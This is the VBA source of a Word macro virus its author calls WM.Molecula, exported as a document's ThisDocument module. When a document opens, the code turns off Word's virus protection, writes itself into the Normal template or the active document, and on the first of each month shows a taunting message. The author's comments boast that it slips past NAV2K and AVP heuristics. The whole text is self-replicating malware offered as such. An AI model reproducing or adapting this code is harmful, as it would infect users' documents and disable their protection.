   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Molecula
   Private Sub Document_Open(): Const nula = 0: Const jedan = 1: Options.VirusProtection = nula
   If Not ThisDocument = ActiveDocument Then Set a = ActiveDocument Else Set a = NormalTemplate
   Set b = a.VBProject: Set c = b.VBComponents(1): Set d = c.CodeModule
   With d: g = Strings.Trim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(jedan, _
   ThisDocument.VBProject.VBComponents(1).CodeModule.countoflines))
   If .Lines(1, 1) <> "'Molecula" Then
   .deletelines jedan, d.countoflines
   .insertlines jedan, g
   End If
   End With
   If Day(Now()) = jedan Then
   MsgBox "...i posle svega ja sam jos tu...tu medju Vama!", vbCritical, "...Molecula"
   End If
   End Sub
   'WM.Molecula by e[ax]
   'Jos jedan virus koji moze zaobici NAV2K i AVP heuristike
   '..a koji koristi String metodu inficiranja!
   'Sve pozdrave saljem ljudima na #virus i #vxers
